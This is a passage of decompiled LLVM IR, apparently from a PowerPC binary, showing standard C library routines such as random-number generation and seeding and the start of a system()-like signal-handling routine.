  %v0_1000f67c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_1000f67c, i32* %v2_1000f5c4, align 4
  %v0_1000f698.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1000f694

dec_label_pc_1000f684:                            ; preds = %dec_label_pc_1000f5f4
  %v0_1000f684 = call i32 @function_1000c85c()
  store i32 %v0_1000f684, i32* %r3.global-to-local, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v2_1000f68c = inttoptr i32 %v0_1000f684 to i32*
  store i32 22, i32* %v2_1000f68c, align 4
  store i32 -1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1000f694

dec_label_pc_1000f694:                            ; preds = %dec_label_pc_1000f678, %dec_label_pc_1000f684
  %v0_1000f698 = phi i32 [ %v0_1000f698.pre, %dec_label_pc_1000f678 ], [ -1, %dec_label_pc_1000f684 ]
  store i32 %v0_1000f5b8, i32* %r0.global-to-local, align 4
  store i32 %v0_1000f698, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000f698

; uselistorder directives
  uselistorder i32 %v0_1000f698, { 1, 0 }
  uselistorder i32 %v0_1000f640, { 0, 2, 1 }
  uselistorder i32 %v0_1000f634, { 1, 0 }
  uselistorder i32 %v1_1000f618, { 2, 1, 0 }
  uselistorder i32 %v2_1000f608, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v3_1000f5c4, { 1, 2, 0, 3 }
  uselistorder i32 %tmp, { 1, 2, 6, 5, 3, 0, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder label %dec_label_pc_1000f694, { 1, 0 }
  uselistorder label %dec_label_pc_1000f678, { 1, 0 }
  uselistorder label %dec_label_pc_1000f5f4, { 1, 0 }
}

define i32 @function_1000f6a8(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000f6a8:
  %r10.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v1_1000f6a8 = add i32 %tmp, 12
  %v2_1000f6a8 = inttoptr i32 %v1_1000f6a8 to i32*
  %v3_1000f6a8 = load i32, i32* %v2_1000f6a8, align 4
  %v1_1000f6b4 = add i32 %tmp, 8
  %v2_1000f6b4 = inttoptr i32 %v1_1000f6b4 to i32*
  %v3_1000f6b4 = load i32, i32* %v2_1000f6b4, align 4
  store i32 %v3_1000f6b4, i32* %r7.global-to-local, align 4
  %v3_1000f6b8 = icmp eq i32 %v3_1000f6a8, 0
  br i1 %v3_1000f6b8, label %dec_label_pc_1000f6c0, label %dec_label_pc_1000f6dc

dec_label_pc_1000f6c0:                            ; preds = %dec_label_pc_1000f6a8
  %v1_1000f6c0 = inttoptr i32 %v3_1000f6b4 to i32*
  %v2_1000f6c0 = load i32, i32* %v1_1000f6c0, align 4
  %v2_1000f6c4 = mul i32 %v2_1000f6c0, 1103515245
  %v1_1000f6c8 = add i32 %v2_1000f6c4, 12345
  %v1_1000f6cc = urem i32 %v1_1000f6c8, -2147483648
  store i32 %v1_1000f6cc, i32* %r9.global-to-local, align 4
  store i32 %v1_1000f6cc, i32* %v1_1000f6c0, align 4
  %v0_1000f6d4 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000f6d4 = inttoptr i32 %arg2 to i32*
  store i32 %v0_1000f6d4, i32* %v2_1000f6d4, align 4
  br label %dec_label_pc_1000f730

dec_label_pc_1000f6dc:                            ; preds = %dec_label_pc_1000f6a8
  %v2_1000f6dc = load i32, i32* %arg1, align 4
  %v1_1000f6e0 = add i32 %tmp, 4
  %v2_1000f6e0 = inttoptr i32 %v1_1000f6e0 to i32*
  %v3_1000f6e0 = load i32, i32* %v2_1000f6e0, align 4
  store i32 %v3_1000f6e0, i32* %r9.global-to-local, align 4
  %v1_1000f6e4 = add i32 %tmp, 24
  %v2_1000f6e4 = inttoptr i32 %v1_1000f6e4 to i32*
  %v3_1000f6e4 = load i32, i32* %v2_1000f6e4, align 4
  %v1_1000f6e8 = add i32 %v2_1000f6dc, 4
  store i32 %v1_1000f6e8, i32* %r8.global-to-local, align 4
  %v1_1000f6ec = add i32 %v3_1000f6e0, 4
  %v1_1000f6f0 = inttoptr i32 %v3_1000f6e0 to i32*
  %v2_1000f6f0 = load i32, i32* %v1_1000f6f0, align 4
  store i32 %v2_1000f6f0, i32* %r9.global-to-local, align 4
  store i32 %v1_1000f6ec, i32* %r10.global-to-local, align 4
  %v2_1000f6fc = icmp ult i32 %v1_1000f6e8, %v3_1000f6e4
  %v1_1000f700 = inttoptr i32 %v2_1000f6dc to i32*
  %v2_1000f700 = load i32, i32* %v1_1000f700, align 4
  %v2_1000f704 = add i32 %v2_1000f700, %v2_1000f6f0
  %v1_1000f708 = udiv i32 %v2_1000f704, 2
  store i32 %v1_1000f708, i32* %r9.global-to-local, align 4
  store i32 %v2_1000f704, i32* %v1_1000f700, align 4
  %v0_1000f710 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000f710 = inttoptr i32 %arg2 to i32*
  store i32 %v0_1000f710, i32* %v2_1000f710, align 4
  br i1 %v2_1000f6fc, label %dec_label_pc_1000f720, label %dec_label_pc_1000f718

dec_label_pc_1000f718:                            ; preds = %dec_label_pc_1000f6dc
  %v0_1000f718 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1000f718, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000f728

dec_label_pc_1000f720:                            ; preds = %dec_label_pc_1000f6dc
  %v2_1000f6f4 = icmp ult i32 %v1_1000f6ec, %v3_1000f6e4
  br i1 %v2_1000f6f4, label %dec_label_pc_1000f728, label %dec_label_pc_1000f724

dec_label_pc_1000f724:                            ; preds = %dec_label_pc_1000f720
  %v0_1000f724 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1000f724, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000f728

dec_label_pc_1000f728:                            ; preds = %dec_label_pc_1000f720, %dec_label_pc_1000f718, %dec_label_pc_1000f724
  %v0_1000f728 = load i32, i32* %r10.global-to-local, align 4
  store i32 %v0_1000f728, i32* %v2_1000f6e0, align 4
  %v0_1000f72c = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_1000f72c, i32* %arg1, align 4
  br label %dec_label_pc_1000f730

dec_label_pc_1000f730:                            ; preds = %dec_label_pc_1000f6c0, %dec_label_pc_1000f728
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_1000f704, { 1, 0 }
  uselistorder i32 %v1_1000f6ec, { 1, 0 }
  uselistorder i32 %v3_1000f6e4, { 1, 0 }
  uselistorder i32 %v3_1000f6e0, { 1, 0, 2 }
  uselistorder i32 %v1_1000f6cc, { 1, 0 }
  uselistorder i32 %tmp, { 2, 1, 0, 3 }
  uselistorder i32* %r8.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r10.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000f730, { 1, 0 }
  uselistorder label %dec_label_pc_1000f728, { 2, 0, 1 }
}

define i32 @function_1000f738() local_unnamed_addr {
dec_label_pc_1000f738:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_1000f73c = load i32, i32* @lr, align 4
  store i32 %v0_1000f73c, i32* %r0.global-to-local, align 4
  %v0_1000f748 = load i32, i32* @r4, align 4
  store i32 %v0_1000f748, i32* @r30, align 4
  %v1_1000f750 = add i32 %v0_1000f748, 12
  %v2_1000f750 = inttoptr i32 %v1_1000f750 to i32*
  %v3_1000f750 = load i32, i32* %v2_1000f750, align 4
  store i32 %v3_1000f750, i32* %r0.global-to-local, align 4
  %v2_1000f754 = icmp ugt i32 %v3_1000f750, 4
  br i1 %v2_1000f754, label %dec_label_pc_1000f804, label %dec_label_pc_1000f75c

dec_label_pc_1000f75c:                            ; preds = %dec_label_pc_1000f738
  %v0_1000f75c = load i32, i32* @r3, align 4
  %v3_1000f75c = icmp eq i32 %v0_1000f75c, 0
  %v1_1000f760 = add i32 %v0_1000f748, 8
  %v2_1000f760 = inttoptr i32 %v1_1000f760 to i32*
  %v3_1000f760 = load i32, i32* %v2_1000f760, align 4
  store i32 %v3_1000f760, i32* %r10.global-to-local, align 4
  br i1 %v3_1000f75c, label %dec_label_pc_1000f768, label %dec_label_pc_1000f76c

dec_label_pc_1000f768:                            ; preds = %dec_label_pc_1000f75c
  store i32 1, i32* @r3, align 4
  br label %dec_label_pc_1000f76c

dec_label_pc_1000f76c:                            ; preds = %dec_label_pc_1000f75c, %dec_label_pc_1000f768
  %v0_1000f770 = phi i32 [ %v0_1000f75c, %dec_label_pc_1000f75c ], [ 1, %dec_label_pc_1000f768 ]
  %v3_1000f76c = icmp eq i32 %v3_1000f750, 0
  %v2_1000f770 = inttoptr i32 %v3_1000f760 to i32*
  store i32 %v0_1000f770, i32* %v2_1000f770, align 4
  br i1 %v3_1000f76c, label %dec_label_pc_1000f800, label %dec_label_pc_1000f778

dec_label_pc_1000f778:                            ; preds = %dec_label_pc_1000f76c
  %v0_1000f778 = load i32, i32* @r30, align 4
  %v1_1000f778 = add i32 %v0_1000f778, 16
  %v2_1000f778 = inttoptr i32 %v1_1000f778 to i32*
  %v3_1000f778 = load i32, i32* %v2_1000f778, align 4
  store i32 %v3_1000f778, i32* %r11.global-to-local, align 4
  store i32 127773, i32* %r8.global-to-local, align 4
  store i32 2147483647, i32* %r7.global-to-local, align 4
  %v0_1000f78c = load i32, i32* %r10.global-to-local, align 4
  store i32 %v3_1000f778, i32* %ctr.global-to-local, align 4
  %tmp18 = icmp sgt i32 %v3_1000f778, 0
  br i1 %tmp18, label %dec_label_pc_1000f7cc.preheader, label %dec_label_pc_1000f7cc.preheader.thread

dec_label_pc_1000f7cc.preheader.thread:           ; preds = %dec_label_pc_1000f778
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000f7d0

dec_label_pc_1000f7cc.preheader:                  ; preds = %dec_label_pc_1000f778
  %v1_1000f7cc2 = add i32 %v3_1000f778, -1
  store i32 %v1_1000f7cc2, i32* %ctr.global-to-local, align 4
  %v2_1000f7cc3 = icmp eq i32 %v1_1000f7cc2, 0
  br i1 %v2_1000f7cc3, label %dec_label_pc_1000f7d0, label %dec_label_pc_1000f7a8

dec_label_pc_1000f7a8:                            ; preds = %dec_label_pc_1000f7cc.preheader, %dec_label_pc_1000f7c8.dec_label_pc_1000f7a8_crit_edge
  %v1_1000f7c8 = phi i32 [ %v2_1000f7c8, %dec_label_pc_1000f7c8.dec_label_pc_1000f7a8_crit_edge ], [ %v0_1000f78c, %dec_label_pc_1000f7cc.preheader ]
  %v1_1000f7a8 = phi i32 [ %v1_1000f7a8.pre, %dec_label_pc_1000f7c8.dec_label_pc_1000f7a8_crit_edge ], [ 127773, %dec_label_pc_1000f7cc.preheader ]
  %v0_1000f7a8 = load i32, i32* @r3, align 4
  %v2_1000f7a8 = sdiv i32 %v0_1000f7a8, %v1_1000f7a8
  %v2_1000f7ac = mul i32 %v2_1000f7a8, %v1_1000f7a8
  %v1_1000f7b0 = mul i32 %v2_1000f7a8, 2836
  store i32 %v1_1000f7b0, i32* %r0.global-to-local, align 4
  %v2_1000f7b4 = sub i32 %v0_1000f7a8, %v2_1000f7ac
  %v1_1000f7b8 = mul i32 %v2_1000f7b4, 16807
  %v2_1000f7bc = sub i32 %v1_1000f7b8, %v1_1000f7b0
  store i32 %v2_1000f7bc, i32* @r3, align 4
  %tmp19 = icmp sgt i32 %v2_1000f7bc, -1
  br i1 %tmp19, label %dec_label_pc_1000f7c8, label %dec_label_pc_1000f7c4

dec_label_pc_1000f7c4:                            ; preds = %dec_label_pc_1000f7a8
  %v1_1000f7c4 = load i32, i32* %r7.global-to-local, align 4
  %v2_1000f7c4 = add i32 %v1_1000f7c4, %v2_1000f7bc
  store i32 %v2_1000f7c4, i32* @r3, align 4
  br label %dec_label_pc_1000f7c8

dec_label_pc_1000f7c8:                            ; preds = %dec_label_pc_1000f7a8, %dec_label_pc_1000f7c4
  %v0_1000f7c8 = phi i32 [ %v2_1000f7bc, %dec_label_pc_1000f7a8 ], [ %v2_1000f7c4, %dec_label_pc_1000f7c4 ]
  %v2_1000f7c8 = add i32 %v1_1000f7c8, 4
  %v3_1000f7c8 = inttoptr i32 %v2_1000f7c8 to i32*
  store i32 %v0_1000f7c8, i32* %v3_1000f7c8, align 4
  %v0_1000f7cc = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000f7cc = add i32 %v0_1000f7cc, -1
  store i32 %v1_1000f7cc, i32* %ctr.global-to-local, align 4
  %v2_1000f7cc = icmp eq i32 %v1_1000f7cc, 0
  br i1 %v2_1000f7cc, label %dec_label_pc_1000f7cc.dec_label_pc_1000f7d0_crit_edge, label %dec_label_pc_1000f7c8.dec_label_pc_1000f7a8_crit_edge

dec_label_pc_1000f7c8.dec_label_pc_1000f7a8_crit_edge: ; preds = %dec_label_pc_1000f7c8
  %v1_1000f7a8.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000f7a8

dec_label_pc_1000f7cc.dec_label_pc_1000f7d0_crit_edge: ; preds = %dec_label_pc_1000f7c8
  %v0_1000f7d0.pre = load i32, i32* @r30, align 4
  %v0_1000f7d4.pre = load i32, i32* %r11.global-to-local, align 4
  %v0_1000f7d8.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000f7d0

dec_label_pc_1000f7d0:                            ; preds = %dec_label_pc_1000f7cc.preheader.thread, %dec_label_pc_1000f7cc.dec_label_pc_1000f7d0_crit_edge, %dec_label_pc_1000f7cc.preheader
  %v0_1000f7d8 = phi i32 [ %v0_1000f7d8.pre, %dec_label_pc_1000f7cc.dec_label_pc_1000f7d0_crit_edge ], [ %v0_1000f78c, %dec_label_pc_1000f7cc.preheader ], [ %v0_1000f78c, %dec_label_pc_1000f7cc.preheader.thread ]
  %v0_1000f7d4 = phi i32 [ %v0_1000f7d4.pre, %dec_label_pc_1000f7cc.dec_label_pc_1000f7d0_crit_edge ], [ %v3_1000f778, %dec_label_pc_1000f7cc.preheader ], [ %v3_1000f778, %dec_label_pc_1000f7cc.preheader.thread ]
  %v1_1000f7d8 = phi i32 [ %v0_1000f7d0.pre, %dec_label_pc_1000f7cc.dec_label_pc_1000f7d0_crit_edge ], [ %v0_1000f778, %dec_label_pc_1000f7cc.preheader ], [ %v0_1000f778, %dec_label_pc_1000f7cc.preheader.thread ]
  %v1_1000f7d0 = add i32 %v1_1000f7d8, 20
  %v2_1000f7d0 = inttoptr i32 %v1_1000f7d0 to i32*
  %v3_1000f7d0 = load i32, i32* %v2_1000f7d0, align 4
  store i32 %v3_1000f7d0, i32* %r0.global-to-local, align 4
  %v1_1000f7d4 = mul i32 %v0_1000f7d4, 10
  store i32 %v1_1000f7d4, i32* %r31.global-to-local, align 4
  %v2_1000f7d8 = add i32 %v1_1000f7d8, 4
  %v3_1000f7d8 = inttoptr i32 %v2_1000f7d8 to i32*
  store i32 %v0_1000f7d8, i32* %v3_1000f7d8, align 4
  %v0_1000f7dc = load i32, i32* %r0.global-to-local, align 4
  %v1_1000f7dc = mul i32 %v0_1000f7dc, 4
  %v0_1000f7e0 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000f7e0 = add i32 %v0_1000f7e0, %v1_1000f7dc
  store i32 %v2_1000f7e0, i32* %r0.global-to-local, align 4
  %v1_1000f7e4 = load i32, i32* @r30, align 4
  %v2_1000f7e4 = inttoptr i32 %v1_1000f7e4 to i32*
  store i32 %v2_1000f7e0, i32* %v2_1000f7e4, align 4
  %v2_1000f7f8 = ptrtoint i32* %stack_var_-24 to i32
  %v0_1000f7f021 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000f7f022 = add i32 %v0_1000f7f021, -1
  store i32 %v1_1000f7f022, i32* @r31, align 4
  %tmp2025 = icmp sgt i32 %v1_1000f7f022, -1
  br i1 %tmp2025, label %dec_label_pc_1000f7ec, label %dec_label_pc_1000f800

dec_label_pc_1000f7ec:                            ; preds = %dec_label_pc_1000f7d0, %dec_label_pc_1000f7ec
  %v0_1000f7f426 = load i32, i32* @r30, align 4
  %v2_1000f7ec = inttoptr i32 %v0_1000f7f426 to i32*
  %v3_1000f7ec = call i32 @function_1000f6a8(i32* %v2_1000f7ec, i32 %v2_1000f7f8)
  %v0_1000f7f0 = load i32, i32* @r31, align 4
  %v1_1000f7f0 = add i32 %v0_1000f7f0, -1
  store i32 %v1_1000f7f0, i32* @r31, align 4
  %tmp20 = icmp sgt i32 %v1_1000f7f0, -1
  br i1 %tmp20, label %dec_label_pc_1000f7ec, label %dec_label_pc_1000f800

dec_label_pc_1000f800:                            ; preds = %dec_label_pc_1000f7d0, %dec_label_pc_1000f7ec, %dec_label_pc_1000f76c
  br label %dec_label_pc_1000f804

dec_label_pc_1000f804:                            ; preds = %dec_label_pc_1000f738, %dec_label_pc_1000f800
  %v0_1000f808 = phi i32 [ -1, %dec_label_pc_1000f738 ], [ 0, %dec_label_pc_1000f800 ]
  store i32 %v0_1000f73c, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000f808

; uselistorder directives
  uselistorder i32 %v1_1000f7cc, { 1, 0 }
  uselistorder i32 %v2_1000f7c8, { 1, 0 }
  uselistorder i32 %v2_1000f7bc, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1000f7a8, { 1, 0 }
  uselistorder i32 %v0_1000f78c, { 1, 2, 0 }
  uselistorder i32 %v3_1000f778, { 1, 2, 0, 4, 3, 5 }
  uselistorder i32* %r10.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %ctr.global-to-local, { 1, 3, 4, 0, 2 }
  uselistorder label %dec_label_pc_1000f804, { 1, 0 }
  uselistorder label %dec_label_pc_1000f800, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000f7ec, { 1, 0 }
  uselistorder label %dec_label_pc_1000f7d0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000f7c8, { 1, 0 }
  uselistorder label %dec_label_pc_1000f7a8, { 1, 0 }
  uselistorder label %dec_label_pc_1000f76c, { 1, 0 }
}

define i32 @function_1000f81c(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1000f81c:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v0_1000f820 = load i32, i32* @lr, align 4
  store i32 %v0_1000f820, i32* %r0.global-to-local, align 4
  %v2_1000f824 = icmp ugt i32 %arg2, 127
  store i32 268566528, i32* %r9.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1001a124.773 to i32), i32* %r11.global-to-local, align 4
  store i32 %tmp, i32* %r27.global-to-local, align 4
  %v1_1000f83c = sub i32 255, %arg2
  %v2_1000f83c = sub i32 -1, %arg2
  %not.v5_1000f83c = icmp ugt i32 %v1_1000f83c, %v2_1000f83c
  %v6_1000f840 = sext i1 %not.v5_1000f83c to i32
  %v1_1000f844 = add i32 %tmp, 4
  store i32 %v1_1000f844, i32* %r29.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  %v1_1000f854 = sub nsw i32 3, %v6_1000f840
  store i32 %v1_1000f854, i32* @r31, align 4
  br i1 %v2_1000f824, label %dec_label_pc_1000f87c, label %dec_label_pc_1000f85c

dec_label_pc_1000f85c:                            ; preds = %dec_label_pc_1000f81c
  %v2_1000f830 = icmp ugt i32 %arg2, 31
  %v1_1000f85c = sub i32 63, %arg2
  %not.v5_1000f85c = icmp ugt i32 %v1_1000f85c, %v2_1000f83c
  %v6_1000f860 = sext i1 %not.v5_1000f85c to i32
  %v1_1000f868 = sub nsw i32 1, %v6_1000f860
  store i32 %v1_1000f868, i32* @r31, align 4
  br i1 %v2_1000f830, label %dec_label_pc_1000f87c, label %dec_label_pc_1000f870

dec_label_pc_1000f870:                            ; preds = %dec_label_pc_1000f85c
  store i32 22, i32* %r28.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  %tmp6 = icmp ult i32 %arg2, 8
  br i1 %tmp6, label %dec_label_pc_1000f8dc, label %dec_label_pc_1000f87c

dec_label_pc_1000f87c:                            ; preds = %dec_label_pc_1000f870, %dec_label_pc_1000f85c, %dec_label_pc_1000f81c
  %v0_1000f87c = phi i32 [ 0, %dec_label_pc_1000f870 ], [ %v1_1000f868, %dec_label_pc_1000f85c ], [ %v1_1000f854, %dec_label_pc_1000f81c ]
  %v1_1000f87c = mul nsw i32 %v0_1000f87c, 4
  store i32 %v1_1000f87c, i32* %r0.global-to-local, align 4
  %v2_1000f880 = add i32 %arg3, 12
  %v3_1000f880 = inttoptr i32 %v2_1000f880 to i32*
  store i32 %v0_1000f87c, i32* %v3_1000f880, align 4
  %v0_1000f884 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000f884 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000f884 = add i32 %v1_1000f884, %v0_1000f884
  store i32 %v2_1000f884, i32* %r9.global-to-local, align 4
  %v3_1000f888 = inttoptr i32 %v2_1000f884 to i32*
  %v4_1000f888 = load i32, i32* %v3_1000f888, align 4
  store i32 %v4_1000f888, i32* %r0.global-to-local, align 4
  %v1_1000f88c = add i32 %v2_1000f884, 20
  %v2_1000f88c = inttoptr i32 %v1_1000f88c to i32*
  %v3_1000f88c = load i32, i32* %v2_1000f88c, align 4
  store i32 %v3_1000f88c, i32* %r9.global-to-local, align 4
  %v0_1000f890 = load i32, i32* %r29.global-to-local, align 4
  %v1_1000f890 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000f890 = add i32 %v1_1000f890, 8
  %v3_1000f890 = inttoptr i32 %v2_1000f890 to i32*
  store i32 %v0_1000f890, i32* %v3_1000f890, align 4
  %v0_1000f894 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000f894 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000f894 = add i32 %v1_1000f894, 20
  %v3_1000f894 = inttoptr i32 %v2_1000f894 to i32*
  store i32 %v0_1000f894, i32* %v3_1000f894, align 4
  %v0_1000f898 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000f898 = mul i32 %v0_1000f898, 4
  store i32 %v1_1000f898, i32* %r0.global-to-local, align 4
  %v1_1000f89c = load i32, i32* %r30.global-to-local, align 4
  %v2_1000f89c = add i32 %v1_1000f89c, 16
  %v3_1000f89c = inttoptr i32 %v2_1000f89c to i32*
  store i32 %v0_1000f898, i32* %v3_1000f89c, align 4
  %v0_1000f8a0 = load i32, i32* %r29.global-to-local, align 4
  %v1_1000f8a0 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000f8a0 = add i32 %v1_1000f8a0, %v0_1000f8a0
  store i32 %v2_1000f8a0, i32* %r0.global-to-local, align 4
  %v1_1000f8a4 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000f8a4 = add i32 %v1_1000f8a4, 24
  %v3_1000f8a4 = inttoptr i32 %v2_1000f8a4 to i32*
  store i32 %v2_1000f8a0, i32* %v3_1000f8a4, align 4
  store i32 ptrtoint (i32* @global_var_1000f8ac.775 to i32), i32* @lr, align 4
  %v0_1000f8a8 = call i32 @function_1000f738()
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1000f8b0 = load i32, i32* @r31, align 4
  %v3_1000f8b0 = icmp eq i32 %v0_1000f8b0, 0
  %v1_1000f8b4 = load i32, i32* %r27.global-to-local, align 4
  %v2_1000f8b4 = inttoptr i32 %v1_1000f8b4 to i32*
  store i32 0, i32* %v2_1000f8b4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br i1 %v3_1000f8b0, label %dec_label_pc_1000f8f0, label %dec_label_pc_1000f8c0

dec_label_pc_1000f8c0:                            ; preds = %dec_label_pc_1000f87c
  %v0_1000f8c0 = load i32, i32* @r30, align 4
  %v1_1000f8c0 = add i32 %v0_1000f8c0, 4
  %v2_1000f8c0 = inttoptr i32 %v1_1000f8c0 to i32*
  %v3_1000f8c0 = load i32, i32* %v2_1000f8c0, align 4
  %v0_1000f8c4 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000f8c4 = sub i32 %v3_1000f8c0, %v0_1000f8c4
  %v4_1000f8c8 = sdiv i32 %v2_1000f8c4, 4
  %v1_1000f8cc = mul i32 %v4_1000f8c8, 5
  %v1_1000f8d0 = load i32, i32* @r31, align 4
  %v2_1000f8d0 = add i32 %v1_1000f8cc, %v1_1000f8d0
  store i32 %v2_1000f8d0, i32* %r0.global-to-local, align 4
  %v1_1000f8d4 = load i32, i32* %r27.global-to-local, align 4
  %v2_1000f8d4 = inttoptr i32 %v1_1000f8d4 to i32*
  store i32 %v2_1000f8d0, i32* %v2_1000f8d4, align 4
  %v0_1000f900.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000f8f0

dec_label_pc_1000f8dc:                            ; preds = %dec_label_pc_1000f870
  %v0_1000f8dc = call i32 @function_1000c85c()
  store i32 %v0_1000f8dc, i32* %r3.global-to-local, align 4
  %v0_1000f8e0 = load i32, i32* %r28.global-to-local, align 4
  %v2_1000f8e0 = inttoptr i32 %v0_1000f8dc to i32*
  store i32 %v0_1000f8e0, i32* %v2_1000f8e0, align 4
  %v0_1000f8e4 = call i32 @function_1000c85c()
  %v0_1000f8e8 = load i32, i32* %r28.global-to-local, align 4
  %v2_1000f8e8 = inttoptr i32 %v0_1000f8e4 to i32*
  store i32 %v0_1000f8e8, i32* %v2_1000f8e8, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000f8f0

dec_label_pc_1000f8f0:                            ; preds = %dec_label_pc_1000f87c, %dec_label_pc_1000f8c0, %dec_label_pc_1000f8dc
  %v0_1000f900 = phi i32 [ 0, %dec_label_pc_1000f87c ], [ %v0_1000f900.pre, %dec_label_pc_1000f8c0 ], [ -1, %dec_label_pc_1000f8dc ]
  store i32 %v0_1000f820, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000f900

; uselistorder directives
  uselistorder i32 %v0_1000f898, { 1, 0 }
  uselistorder i32 %v2_1000f884, { 1, 0, 2 }
  uselistorder i32 %v0_1000f87c, { 1, 0 }
  uselistorder i32 %v2_1000f83c, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 7, 2, 3, 4, 5, 6, 8, 9, 10 }
  uselistorder i32 ()* @function_1000f738, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1001a124.773 to i32), { 2, 1, 0, 3 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 3, 5, 0, 2, 4 }
  uselistorder label %dec_label_pc_1000f8f0, { 2, 1, 0 }
}

define i32 @function_1000f904(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000f904:
  %stack_var_-40 = alloca i32, align 4
  %v3_1000f910 = icmp eq i32 %arg1, 0
  store i1 false, i1* @cr0_so, align 1
  %v0_1000f914 = load i32, i32* @r31, align 4
  br i1 %v3_1000f910, label %dec_label_pc_1000fa44, label %dec_label_pc_1000f924

dec_label_pc_1000f924:                            ; preds = %dec_label_pc_1000f904
  store i32 268499248, i32* @lr, align 4
  %v2_1000f92c = call i32 @function_1000ee08(i32 3, i32 1)
  store i32 268499264, i32* @lr, align 4
  %v2_1000f93c = call i32 @function_1000ee08(i32 2, i32 1)
  store i32 268499280, i32* @lr, align 4
  %v2_1000f94c = call i32 @function_1000ee08(i32 17, i32 0)
  store i32 %v2_1000f94c, i32* @r3, align 4
  store i32 268499288, i32* @lr, align 4
  %v0_1000f954 = call i32 @function_1000c130()
  store i32 %v0_1000f954, i32* @r31, align 4
  %tmp10 = icmp sgt i32 %v0_1000f954, -1
  br i1 %tmp10, label %dec_label_pc_1000f98c, label %dec_label_pc_1000f960

dec_label_pc_1000f960:                            ; preds = %dec_label_pc_1000f924
  store i32 268499308, i32* @lr, align 4
  %v2_1000f968 = call i32 @function_1000ee08(i32 3, i32 %v2_1000f92c)
  store i32 268499320, i32* @lr, align 4
  %v2_1000f974 = call i32 @function_1000ee08(i32 2, i32 %v2_1000f93c)
  store i32 268499332, i32* @lr, align 4
  %v2_1000f980 = call i32 @function_1000ee08(i32 17, i32 %v2_1000f94c)
  br label %dec_label_pc_1000fa44

dec_label_pc_1000f98c:                            ; preds = %dec_label_pc_1000f924
  %v3_1000f958 = icmp eq i32 %v0_1000f954, 0
  br i1 %v3_1000f958, label %dec_label_pc_1000f990, label %dec_label_pc_1000f9e4

dec_label_pc_1000f990:                            ; preds = %dec_label_pc_1000f98c
  store i32 268499356, i32* @lr, align 4
  %v2_1000f998 = call i32 @function_1000ee08(i32 3, i32 0)
  store i32 268499368, i32* @lr, align 4
  %v2_1000f9a4 = call i32 @function_1000ee08(i32 2, i32 0)
  store i32 268499380, i32* @lr, align 4
  %v2_1000f9b0 = call i32 @function_1000ee08(i32 17, i32 0)
